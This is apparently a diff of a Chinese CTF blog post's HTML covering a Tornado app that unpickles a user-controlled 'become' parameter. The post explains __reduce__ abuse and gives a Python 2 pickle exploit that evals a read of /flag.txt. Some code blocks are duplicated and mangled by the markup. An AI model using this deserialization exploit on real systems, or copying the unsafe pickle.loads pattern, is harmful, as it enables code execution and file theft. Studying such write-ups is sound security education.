class="hljs-params">(self, *args, **kwargs)</span>:</span><br>        <span class="hljs-keyword">try</span>:<br>            become = self.get_argument(<span class="hljs-string">'become'</span>)<br>            p = pickle.loads(urllib.unquote(become))<br>            <span class="hljs-keyword">return</span> self.render(<span class="hljs-string">'form.html'</span>, res=p, member=<span class="hljs-number">1</span>)<br>        <span class="hljs-keyword">except</span>:<br>            <span class="hljs-keyword">return</span> self.render(<span class="hljs-string">'form.html'</span>, res=<span class="hljs-string">'This is Black Technology!'</span>, member=<span class="hljs-number"><code class="language-hljs python"><span class="hljs-keyword">import</span> tornado.web<br><span class="hljs-keyword">from</span> sshop.base <span class="hljs-keyword">import</span> BaseHandler<br><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> urllib<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">AdminHandler</span><span class="hljs-params">(BaseHandler)</span>:</span><br><span class="hljs-meta">    @tornado.web.authenticated</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get</span><span class="hljs-params">(self, *args, **kwargs)</span>:</span><br>        <span class="hljs-keyword">if</span> self.current_user == <span class="hljs-string">"admin"</span>:<br>            <span class="hljs-keyword">return</span> self.render(<span class="hljs-string">'form.html'</span>, res=<span class="hljs-string">'This is Black Technology!'</span>, member=<span class="hljs-number">0</span>)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">return</span> self.render(<span class="hljs-string">'no_ass.html'</span>)<br><br><span class="hljs-meta">    @tornado.web.authenticated</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">post</span><span class="hljs-params">(self, *args, **kwargs)</span>:</span><br>        <span class="hljs-keyword">try</span>:<br>            become = self.get_argument(<span class="hljs-string">'become'</span>)<br>            p = pickle.loads(urllib.unquote(become))<br>            <span class="hljs-keyword">return</span> self.render(<span class="hljs-string">'form.html'</span>, res=p, member=<span class="hljs-number">1</span>)<br>        <span class="hljs-keyword">except</span>:<br>            <span class="hljs-keyword">return</span> self.render(<span class="hljs-string">'form.html'</span>, res=<span class="hljs-string">'This is Black Technology!'</span>, member=<span class="hljs-number">0</span>)<br></code></pre></td></tr></tbody></table></figure>
 <p>漏洞代码出现在这里</p>
-<pre class=" language-python"><code class="language-python">become <span class="token operator">=</span> self<span class="token punctuation">.</span>get_argument<span class="token punctuation">(</span><span class="token string">'become'</span><span class="token punctuation">)</span>
-p <span class="token operator">=</span> pickle<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>urllib<span class="token punctuation">.</span>unquote<span class="token punctuation">(</span>become<span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre>
+<figure class="hljs highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre class=" language-hljs python">become = self.get_argument(<span class="hljs-string"><code class="language-hljs python">become = self.get_argument(<span class="hljs-string">'become'</span>)<br>p = pickle.loads(urllib.unquote(become))<br></code></pre></td></tr></tbody></table></figure>
 <p>关于python反序列化漏洞可以看看这篇文章<a href="https://www.k0rz3n.com/2018/11/12/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E7%90%86%E8%A7%A3%E6%BC%8F%E6%B4%9E%E4%B9%8BPython%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" target="_blank" rel="noopener">一篇文章带你理解漏洞之 Python 反序列化漏洞</a></p>
-<pre class=" language-bash"><code class="language-bash">当序列化以及反序列化的过程中中碰到一无所知的扩展类型<span class="token punctuation">(</span>这里指的就是新式类<span class="token punctuation">)</span>的时候，可以通过类中定义的__reduce__方法来告知如何进行序列化或者反序列化
-也就是说我们，只要在新式类中定义一个 __reduce__ 方法，我们就能在序列化的使用让这个类根据我们在__reduce__ 中指定的方式进行序列化，那这就非常好，那我们该如何指定呢？实际上关键就在这个方法的返回值上，这个方法可以返回两种类型的值，String 和 tuple ,我们的构造点就在令其返回 tuple 的时候
-
-当他返回值是一个元祖的时候，可以提供2到5个参数，我们重点利用的是前两个，第一个参数是一个callable object<span class="token punctuation">(</span>可调用的对象<span class="token punctuation">)</span>，第二个参数可以是一个元祖为这个可调用对象提供必要的参数，如果你认真看上面的 PVM 的指令码，你就会发现这个返回值和其中的一个 R 指令非常的一致，（我猜测这个 R 指令码就是这个 __reduce__ 方法的返回值的底层实现 ）</code></pre>
-<pre class=" language-bash"><code class="language-bash">urllib.unquote<span class="token punctuation">(</span><span class="token punctuation">)</span>
-字符串被当作url提交时会被自动进行url编码处理
-pickle.dump<span class="token punctuation">(</span>obj, file<span class="token punctuation">[</span>, protocol<span class="token punctuation">]</span><span class="token punctuation">)</span>
-序列化对象，并将结果数据流写入到文件对象中。参数protocol是序列化模式，默认值为0，表示以文本的形式序列化。protocol的值还可以是1或2，表示以二进制的形式序列化。
-pickle.load<span class="token punctuation">(</span>file<span class="token punctuation">)</span>
-反序列化对象。将文件中的数据解析为一个Python对象。</code></pre>
+<figure class="hljs highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre class=" language-hljs bash"><code class="language-hljs bash">当序列化以及反序列化的过程中中碰到一无所知的扩展类型(这里指的就是新式类)的时候，可以通过类中定义的__reduce__方法来告知如何进行序列化或者反序列化<br>也就是说我们，只要在新式类中定义一个 __reduce__ 方法，我们就能在序列化的使用让这个类根据我们在__reduce__ 中指定的方式进行序列化，那这就非常好，那我们该如何指定呢？实际上关键就在这个方法的返回值上，这个方法可以返回两种类型的值，String 和 tuple ,我们的构造点就在令其返回 tuple 的时候<br><br>当他返回值是一个元祖的时候，可以提供2到5个参数，我们重点利用的是前两个，第一个参数是一个callable object(可调用的对象)，第二个参数可以是一个元祖为这个可调用对象提供必要的参数，如果你认真看上面的 PVM 的指令码，你就会发现这个返回值和其中的一个 R 指令非常的一致，（我猜测这个 R 指令码就是这个 __reduce__ 方法的返回值的底层实现 ）<br></code></pre></td></tr></tbody></table></figure>
+<figure class="hljs highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre class=" language-hljs bash"><code class="language-hljs bash">urllib.unquote()<br>字符串被当作url提交时会被自动进行url编码处理<br>pickle.dump(obj, file[, protocol])<br>序列化对象，并将结果数据流写入到文件对象中。参数protocol是序列化模式，默认值为0，表示以文本的形式序列化。protocol的值还可以是1或2，表示以二进制的形式序列化。<br>pickle.load(file)<br>反序列化对象。将文件中的数据解析为一个Python对象。<br></code></pre></td></tr></tbody></table></figure>
 <p>exp如下(要在python2下运行)</p>
-<pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> pickle
-<span class="token keyword">import</span> urllib
-
-<span class="token keyword">class</span> <span class="token class-name">payload</span><span class="token punctuation">(</span>object<span class="token punctuation">)</span><span class="token punctuation">:</span>
-    <span class="token keyword">def</span> <span class="token function">__reduce__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
-       <span class="token keyword">return</span> <span class="token punctuation">(</span>eval<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token string">"open('/flag.txt','r').read()"</span><span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
-
-a <span class="token operator">=</span> pickle<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>payload<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
-a <span class="token operator">=</span> urllib<span class="token punctuation">.</span>quote<span class="token punctuation">(</span>a<span class="token punctuation">)</span>
-<span class="token keyword">print</span> a</code></pre>
+<figure class="hljs highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre class=" language-hljs python"><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> urllib<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">payload</span><span class="hljs-params">(object)</span>:</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__reduce__</span><span class="hljs-params">(self)</span>:</span><br>       <span class="hljs-keyword">return</span> (eval, (<span class="hljs-string">"open('/flag.txt','r').read()"</span>,))<br><br>a = pickle.dumps(payload())<br>a = urllib.quote(a)<br><span class="hljs-keyword"><code class="language-hljs python"><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> urllib<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">payload</span><span class="hljs-params">(object)</span>:</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__reduce__</span><span class="hljs-params">(self)</span>:</span><br>       <span class="hljs-keyword">return</span> (eval, (<span class="hljs-string">"open('/flag.txt','r').read()"</span>,))<br><br>a = pickle.dumps(payload())<br>a = urllib.quote(a)<br><span class="hljs-keyword">print</span> a<br></code></pre></td></tr></tbody></table></figure>
 <p>再将a传给become即可<br><img src="/LawlietLW.github.io/2020/02/10/ciscn2019-hua-bei-sai-qu-day1-web2-ikun/19.jpg" alt=""><br><img src="/LawlietLW.github.io/2020/02/10/ciscn2019-hua-bei-sai-qu-day1-web2-ikun/20.jpg" alt=""></p>
 <script>
         document.querySelectorAll('.github-emoji')
@@ -515,557 +234,108 @@ a <span class="token operator">=</span> urllib<span class="token punctuation">.<
             document.body.appendChild(img);
           });
       </script>
-            </div>
-            <hr/>
-
-            
-
-    <div class="reprint" id="reprint-statement">
+    </main>
+    <footer class="post-footer">
+      
+      <div class="post-tags">
         
-            <div class="reprint__author">
-                <span class="reprint-meta" style="font-weight: bold;">
-                    <i class="fas fa-user">
-                        文章作者:
-                    </i>
-                </span>
-                <span class="reprint-info">
-                    <a href="http://LawlietLW.github.io" rel="external nofollow noreferrer">LawlietLW</a>
-                </span>
-            </div>
-            <div class="reprint__type">
-                <span class="reprint-meta" style="font-weight: bold;">
-                    <i class="fas fa-link">
-                        文章链接:
-                    </i>
-                </span>
-                <span class="reprint-info">
-                    <a href="http://LawlietLW.github.io/LawlietLW.github.io/2020/02/10/ciscn2019-hua-bei-sai-qu-day1-web2-ikun/">http://LawlietLW.github.io/LawlietLW.github.io/2020/02/10/ciscn2019-hua-bei-sai-qu-day1-web2-ikun/</a>
-                </span>
-            </div>
-            <div class="reprint__notice">
-                <span class="reprint-meta" style="font-weight: bold;">
-                    <i class="fas fa-copyright">
-                        版权声明:
-                    </i>
-                </span>
-                <span class="reprint-info">
-                    本博客所有文章除特別声明外，均采用
-                    <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
-                    许可协议。转载请注明来源
-                    <a href="http://LawlietLW.github.io" target="_blank">LawlietLW</a>
-                    !
-                </span>
-            </div>
+        <a class="post-tag button" href="/LawlietLW.github.io/tags/python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="tag"><i class="fas fa-tags"></i>python反序列化</a>
         
+        <a class="post-tag button" href="/LawlietLW.github.io/tags/pickle%EF%BC%8CWeb/" rel="tag"><i class="fas fa-tags"></i>pickle，Web</a>
+        
+      </div>
+      
+    </footer>
+  </article>
+  
+  
+  <nav class="page-nav">
+    <div class="page-nav-next page-nav-item">
+      
+      <a href="/LawlietLW.github.io/2020/02/10/zjctf-2019-nizhuansiwei/" rel="next" title="[ZJCTF 2019]NiZhuanSiWei"><i class="fas fa-angle-left"></i><span class="nav-title">[ZJCTF 2019]NiZhuanSiWei</span></a>
+      
     </div>
-
-    <script async defer>
-      document.addEventListener("copy", function (e) {
-        let toastHTML = '<span>复制成功，请遵循本文的转载规则</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">查看</a>';
-        M.toast({html: toastHTML})
-      });
-
-      function navToReprintStatement() {
-        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
-      }
-    </script>
-
-
-
-            <div class="tag_share" style="display: block;">
-                <div class="post-meta__tag-list" style="display: inline-block;">
-                    
-                        <div class="article-tag">
-                            
-                                <a href="/LawlietLW.github.io/tags/python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">
-                                    <span class="chip bg-color">python反序列化</span>
-                                </a>
-                            
-                                <a href="/LawlietLW.github.io/tags/pickle%EF%BC%8CWeb/">
-                                    <span class="chip bg-color">pickle，Web</span>
-                                </a>
-                            
-                        </div>
-                    
-                </div>
-                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
-                    <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
-
-<div id="article-share">
-    
-    
-    <div class="social-share" data-sites="twitter,facebook,google,qq,qzone,wechat,weibo,douban,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
-    <script src="/libs/share/js/social-share.min.js"></script>
-    
-
-    
-
+    <div class="page-nav-prev page-nav-item">
+      
+      <a href="/LawlietLW.github.io/2020/02/10/dong-tai-gui-hua/" rel="prev" title="动态规划的背包问题"><span class="nav-title">动态规划的背包问题</span><i class="fas fa-angle-right"></i></a>
+      
+    </div>
+  </nav>
+  
+  
 </div>
 
-                </div>
-            </div>
-            
+          </div>
+          
+          
+          
+<aside class="sidebar" id="sidebar" style="background: url(/LawlietLW.github.io/images/background.png);">
+  
+  <div class="search">
+    <div class="form-group">
+      <i class="fas fa-search"></i><input type="search" id="search-input" name="q" results="0" placeholder="Search" class="form-control"/>
+    </div>
+  </div>
+  <div class="search-result-box" id="search-result"></div>
+  
+  
+<div class="info sidebar-item" id="info">
+  
+  <h1 class="author-name">Lock</h1>
+  <h2 class="author-description"></h2>
+  <div class="site-count">
+    
+  </div>
+  
+  <div class="rss">
+    <a class="rss-link button sidebar-item" href="/LawlietLW.github.io/atom.xml"><i class="fas fa-rss"></i>RSS</a>
+  </div>
+  
+</div>
+
+
+  <div class="sidebar-sticky">
+    
+    
+    
+    
+    
+    
+    
+    
+  </div>
+</aside>
+
+
+          
         </div>
+      </div>
+    </main>
+    
+<footer id="footer" class="footer">
+  <div class="container">
+    <div class="back-to-top">
+      <button id="back-to-top"><i class="fas fa-angle-double-up" aria-label="Back to Top"></i></button>
     </div>
-
-    
-        <link rel="stylesheet" href="/libs/gitalk/gitalk.css">
-<link rel="stylesheet" href="/css/my-gitalk.css">
-
-<div class="card gitalk-card" data-aos="fade-up">
-    <div class="comment_headling" style="font-size: 20px; font-weight: 700; position: relative; left: 20px; top: 15px; padding-bottom: 5px;">
-        <i class="fas fa-comments fa-fw" aria-hidden="true"></i>
-        <span>评论</span>
-    </div>
-    <div id="gitalk-container" class="card-content"></div>
-</div>
-
-<script src="/libs/gitalk/gitalk.min.js"></script>
-<script>
-    let gitalk = new Gitalk({
-        clientID: '',
-        clientSecret: '',
-        repo: '',
-        owner: '',
-        admin: null,
-        id: '2020-02-10T13-14-44',
-        distractionFreeMode: false  // Facebook-like distraction free mode
-    });
-
-    gitalk.render('gitalk-container');
-</script>
-    
-
-    
-
-    
-
-    
-
-    
-
-    
-
-<article id="prenext-posts" class="prev-next articles">
-    <div class="row article-row">
-        
-        <div class="article col s12 m6" data-aos="fade-up">
-            <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
-            <div class="card">
-                <a href="/LawlietLW.github.io/2020/02/10/dong-tai-gui-hua/">
-                    <div class="card-image">
-                        
-                        
-                        <img src="/medias/featureimages/0.jpg" class="responsive-img" alt="动态规划的背包问题">
-                        
-                        <span class="card-title">动态规划的背包问题</span>
-                    </div>
-                </a>
-                <div class="card-content article-content">
-                    <div class="summary block-with-text">
-                        
-                            01背包和完全背包记录一下这两天学习的动态规划算法，拖了好久了动态规划可以说是递归的升级版，甚至可以替代BFS和DFS，能熟练掌握的话就不用再就纠结用什么搜索算法好了这两天在洛谷上刷了一下动态规划地背包算法部分，深感DP的便利，用贪心算法的
-                        
-                    </div>
-                    <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2020-02-10
-                        </span>
-                        <span class="publish-author">
-                            
-                            <i class="fas fa-bookmark fa-fw icon-category"></i>
-                            
-                            <a href="/LawlietLW.github.io/categories/%E7%AE%97%E6%B3%95/" class="post-category">
-                                    算法
-                                </a>
-                            
-                            
-                        </span>
-                    </div>
-                </div>
-                
-                <div class="card-action article-tags">
-                    
-                    <a href="/LawlietLW.github.io/tags/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/">
-                        <span class="chip bg-color">动态规划</span>
-                    </a>
-                    
-                    <a href="/LawlietLW.github.io/tags/C/">
-                        <span class="chip bg-color">C</span>
-                    </a>
-                    
-                    <a href="/LawlietLW.github.io/tags/%E8%83%8C%E5%8C%85%E9%97%AE%E9%A2%98/">
-                        <span class="chip bg-color">背包问题</span>
-                    </a>
-                    
-                </div>
-                
-            </div>
+    <div class="footer-container">
+      <div class="footer-left">
+        <div class="copyright">
+          <span class="author">Lock</span><span class="year"><i class="far fa-copyright"></i>2020</span>
         </div>
         
-        
-        <div class="article col s12 m6" data-aos="fade-up">
-            <div class="article-badge right-badge text-color">
-                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
-            </div>
-            <div class="card">
-                <a href="/LawlietLW.github.io/2020/02/10/zjctf-2019-nizhuansiwei/">
-                    <div class="card-image">
-                        
-                        
-                        <img src="/medias/featureimages/19.jpg" class="responsive-img" alt="[ZJCTF 2019]NiZhuanSiWei">
-                        
-                        <span class="card-title">[ZJCTF 2019]NiZhuanSiWei</span>
-                    </div>
-                </a>
-                <div class="card-content article-content">
-                    <div class="summary block-with-text">
-                        
-                            打开环境，直接给出了源代码
-&lt;?php  
-$text = $_GET["text"];
-$file = $_GET["file"];
-$password = $_GET["password"];
-if(isset($text)&am
-                        
-                    </div>
-                    <div class="publish-info">
-                            <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2020-02-10
-                            </span>
-                        <span class="publish-author">
-                            
-                            <i class="fas fa-bookmark fa-fw icon-category"></i>
-                            
-                            <a href="/LawlietLW.github.io/categories/CTF/" class="post-category">
-                                    CTF
-                                </a>
-                            
-                            
-                        </span>
-                    </div>
-                </div>
-                
-                <div class="card-action article-tags">
-                    
-                    <a href="/LawlietLW.github.io/tags/Web/">
-                        <span class="chip bg-color">Web</span>
-                    </a>
-                    
-                    <a href="/LawlietLW.github.io/tags/data%E4%BC%AA%E5%8D%8F%E8%AE%AE/">
-                        <span class="chip bg-color">data伪协议</span>
-                    </a>
-                    
-                    <a href="/LawlietLW.github.io/tags/filter%E4%BC%AA%E5%8D%8F%E8%AE%AE/">
-                        <span class="chip bg-color">filter伪协议</span>
-                    </a>
-                    
-                    <a href="/LawlietLW.github.io/tags/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">
-                        <span class="chip bg-color">PHP反序列化</span>
-                    </a>
-                    
-                </div>
-                
-            </div>
+      </div>
+      <div class="footer-right">
+        <div class="custom-info">
+          
         </div>
-        
-    </div>
-</article>
-
-</div>
-
-
-
-<!-- 代码块功能依赖 -->
-<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>
-
-<!-- 代码语言 -->
-
-<script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script>
-
-
-<!-- 代码块复制 -->
-
-<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>
-
-
-<!-- 代码块收缩 -->
-
-<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>
-
-
-<!-- 代码块折行 -->
-
-<style type="text/css">
-code[class*="language-"], pre[class*="language-"] { white-space: pre !important; }
-</style>
-
-
-    </div>
-    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
-        <div class="toc-widget">
-            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;目录</div>
-            <div id="toc-content"></div>
+        <div class="powered-by">
+          Proudly Powered by <a href="https://hexo.io/" target="_blank">Hexo</a> | Theme is <a href="https://github.com/AlynxZhou/hexo-theme-aria/" target="_blank">ARIA</a>
         </div>
+      </div>
     </div>
-</div>
-
-<!-- TOC 悬浮按钮. -->
-
-<div id="floating-toc-btn" class="hide-on-med-and-down">
-    <a class="btn-floating btn-large bg-color">
-        <i class="fas fa-list-ul"></i>
-    </a>
-</div>
-
-
-<script src="/libs/tocbot/tocbot.min.js"></script>
-<script>
-    $(function () {
-        tocbot.init({
-            tocSelector: '#toc-content',
-            contentSelector: '#articleContent',
-            headingsOffset: -($(window).height() * 0.4 - 45),
-            collapseDepth: Number('2'),
-            headingSelector: 'h2, h3, h4'
-        });
-
-        // modify the toc link href to support Chinese.
-        let i = 0;
-        let tocHeading = 'toc-heading-';
-        $('#toc-content a').each(function () {
-            $(this).attr('href', '#' + tocHeading + (++i));
-        });
-
-        // modify the heading title id to support Chinese.
-        i = 0;
-        $('#articleContent').children('h2, h3, h4').each(function () {
-            $(this).attr('id', tocHeading + (++i));
-        });
-
-        // Set scroll toc fixed.
-        let tocHeight = parseInt($(window).height() * 0.4 - 64);
-        let $tocWidget = $('.toc-widget');
-        $(window).scroll(function () {
-            let scroll = $(window).scrollTop();
-            /* add post toc fixed. */
-            if (scroll > tocHeight) {
-                $tocWidget.addClass('toc-fixed');
-            } else {
-                $tocWidget.removeClass('toc-fixed');
-            }
-        });
-
-        
-        /* 修复文章卡片 div 的宽度. */
-        let fixPostCardWidth = function (srcId, targetId) {
-            let srcDiv = $('#' + srcId);
-            if (srcDiv.length === 0) {
-                return;
-            }
-
-            let w = srcDiv.width();
-            if (w >= 450) {
-                w = w + 21;
-            } else if (w >= 350 && w < 450) {
-                w = w + 18;
-            } else if (w >= 300 && w < 350) {
-                w = w + 16;
-            } else {
-                w = w + 14;
-            }
-            $('#' + targetId).width(w);
-        };
-
-        // 切换TOC目录展开收缩的相关操作.
-        const expandedClass = 'expanded';
-        let $tocAside = $('#toc-aside');
-        let $mainContent = $('#main-content');
-        $('#floating-toc-btn .btn-floating').click(function () {
-            if ($tocAside.hasClass(expandedClass)) {
-                $tocAside.removeClass(expandedClass).hide();
-                $mainContent.removeClass('l9');
-            } else {
-                $tocAside.addClass(expandedClass).show();
-                $mainContent.addClass('l9');
-            }
-            fixPostCardWidth('artDetail', 'prenext-posts');
-        });
-        
-    });
-</script>
-
-    
-
-</main>
-
-
-
-    <footer class="page-footer bg-color">
-    <div class="container row center-align" style="margin-bottom: 0px !important;">
-        <div class="col s12 m8 l8 copy-right">
-            Copyright&nbsp;&copy;
-            <span id="year">2019</span>
-            <a href="http://LawlietLW.github.io" target="_blank">LawlietLW</a>
-            |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
-            |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
-            <br>
-            
-            &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">16.5k</span>&nbsp;字
-            
-            
-            
-            
-            
-            
-            <span id="busuanzi_container_site_pv">
-                |&nbsp;<i class="far fa-eye"></i>&nbsp;总访问量:&nbsp;<span id="busuanzi_value_site_pv"
-                    class="white-color"></span>&nbsp;次
-            </span>
-            
-            
-            <span id="busuanzi_container_site_uv">
-                |&nbsp;<i class="fas fa-users"></i>&nbsp;总访问人数:&nbsp;<span id="busuanzi_value_site_uv"
-                    class="white-color"></span>&nbsp;人
-            </span>
-            
-            <br>
-            
-            <br>
-            
-        </div>
-        <div class="col s12 m4 l4 social-link social-statis">
-
-
-    <a href="mailto:2499086884@qq.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
-        <i class="fas fa-envelope-open"></i>
-    </a>
-
-
-
-
-
-
-
-    <a href="tencent://AddContact/?fromId=50&fromSubId=1&subcmd=all&uin=2499086884" class="tooltipped" target="_blank" data-tooltip="QQ联系我: 2499086884" data-position="top" data-delay="50">
-        <i class="fab fa-qq"></i>
-    </a>
-
-
-
-
-
-
-
-    <a href="/LawlietLW.github.io/atom.xml" class="tooltipped" target="_blank" data-tooltip="RSS 订阅" data-position="top" data-delay="50">
-        <i class="fas fa-rss"></i>
-    </a>
-
-</div>
-    </div>
+  </div>
 </footer>
 
-<div class="progress-bar"></div>
 
-
-    <!-- 搜索遮罩框 -->
-<div id="searchModal" class="modal">
-    <div class="modal-content">
-        <div class="search-header">
-            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;搜索</span>
-            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
-                   class="search-input">
-        </div>
-        <div id="searchResult"></div>
-    </div>
-</div>
-
-<script src="/js/search.js"></script>
-<script type="text/javascript">
-$(function () {
-    searchFunc("/LawlietLW.github.io/" + "search.xml", 'searchInput', 'searchResult');
-});
-</script>
-    <!-- 回到顶部按钮 -->
-<div id="backTop" class="top-scroll">
-    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
-        <i class="fas fa-arrow-up"></i>
-    </a>
-</div>
-
-
-    <script src="/libs/materialize/materialize.min.js"></script>
-    <script src="/libs/masonry/masonry.pkgd.min.js"></script>
-    <script src="/libs/aos/aos.js"></script>
-    <script src="/libs/scrollprogress/scrollProgress.min.js"></script>
-    <script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
-    <script src="/js/matery.js"></script>
-
-    <!-- Global site tag (gtag.js) - Google Analytics -->
-
-<script async src="https://www.googletagmanager.com/gtag/js?id="></script>
-<script>
-    window.dataLayer = window.dataLayer || [];
-    function gtag() {
-        dataLayer.push(arguments);
-    }
-
-    gtag('js', new Date());
-    gtag('config', '');
-</script>
-
-
-    <!-- Baidu Analytics -->
-
-<script>
-    var _hmt = _hmt || [];
-    (function () {
-        var hm = document.createElement("script");
-        hm.src = "https://hm.baidu.com/hm.js?";
-        var s = document.getElementsByTagName("script")[0];
-        s.parentNode.insertBefore(hm, s);
-    })();
-</script>
-
-    <!-- Baidu Push -->
-
-<script>
-    (function () {
-        var bp = document.createElement('script');
-        var curProtocol = window.location.protocol.split(':')[0];
-        if (curProtocol === 'https') {
-            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
-        } else {
-            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
-        }
-        var s = document.getElementsByTagName("script")[0];
-        s.parentNode.insertBefore(bp, s);
-    })();
-</script>
-
-    
-    <script src="/libs/others/clicklove.js" async="async"></script>
-    
-    
-    <script async src="/libs/others/busuanzi.pure.mini.js"></script>
-    
-
-    
-
-    
-
-    
-
-    
-
-    
-    
-    
-    <script src="/libs/instantpage/instantpage.js" type="module"></script>
-    
-
-</body>
-
+  </body>
 </html>
